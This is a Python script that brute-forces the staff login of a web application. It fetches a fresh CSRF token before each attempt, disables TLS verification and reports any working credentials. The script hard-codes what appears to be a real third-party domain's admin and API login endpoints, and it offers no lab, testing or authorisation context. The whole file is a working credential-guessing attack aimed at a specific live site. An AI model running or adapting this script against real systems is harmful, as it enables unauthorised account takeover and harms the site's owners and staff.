import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def brute_force(target_url, login_page, user_file, pass_file):
    session = requests.Session()
    print(f"[*] Starting Brute-force on {target_url}...")
    
    with open(user_file, "r") as f:
        usernames = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    
    with open(pass_file, "r") as f:
        passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    for user in usernames:
        for password in passwords:
            try:
                # Get fresh CSRF Token
                r = session.get(login_page, verify=False, timeout=10)
                csrf_match = re.search(r'name="CSRFToken" value="([a-f0-9]+)"', r.text)
                if not csrf_match:
                    print("[-] Failed to find CSRF Token.")
                    return
                csrf_token = csrf_match.group(1)

                # Attempt Login
                payload = {
                    'CSRFToken': csrf_token,
                    'email': user,
                    'password': password
                }
                
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': login_page,
                    'User-Agent': 'Mozilla/5.0'
                }
                
                res = session.post(target_url, data=payload, headers=headers, verify=False, timeout=10)
                
                if '"result":true' in res.text:
                    print(f"\n[!!!] SUCCESS! Found Credentials:")
                    print(f"      User: {user}")
                    print(f"      Pass: {password}")
                    return True
                else:
                    sys.stdout.write(f"\r[*] Trying: {user} | {password} ...")
                    sys.stdout.flush()
            except Exception as e:
                print(f"\n[-] Error: {e}")

    print("\n[-] Brute-force finished. No valid credentials found.")
    return False

if __name__ == "__main__":
    target_api = "https://seodomains.com.hr/api/guest/staff/login"
    login_page = "https://seodomains.com.hr/admin/staff/login"
    user_file = "paragon_usernames.txt"
    pass_file = "paragon_passwords.txt"
    
    brute_force(target_api, login_page, user_file, pass_file)
